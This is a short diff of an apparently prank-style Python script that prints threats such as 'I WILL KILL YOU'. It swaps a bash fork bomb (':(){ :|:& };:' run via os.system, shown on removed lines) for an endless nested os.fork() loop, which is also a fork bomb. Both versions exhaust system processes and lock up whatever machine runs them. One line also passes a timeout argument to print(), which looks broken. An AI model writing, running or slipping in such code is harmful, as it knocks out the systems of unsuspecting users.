@@ -32,14 +32,10 @@ def main():
     print('  \n  ')
     ask()
     print('I WILL KILL YOU')
-
-    os.system('bash -c ":(){ :|:& };: &"')
     while True:
-        try:
-            tprint('BAD')
-            time.sleep(0.5)
-        except:
-           os.system('bash -c ":(){ :|:& };: &"')
+        if os.fork():
+            if os.fork():
+                tprint('HEY U', font="random")
  
 def _pacat():
     print('YOU INTERRUPTED ME! I will now play bad sound!',timeout=0.05)
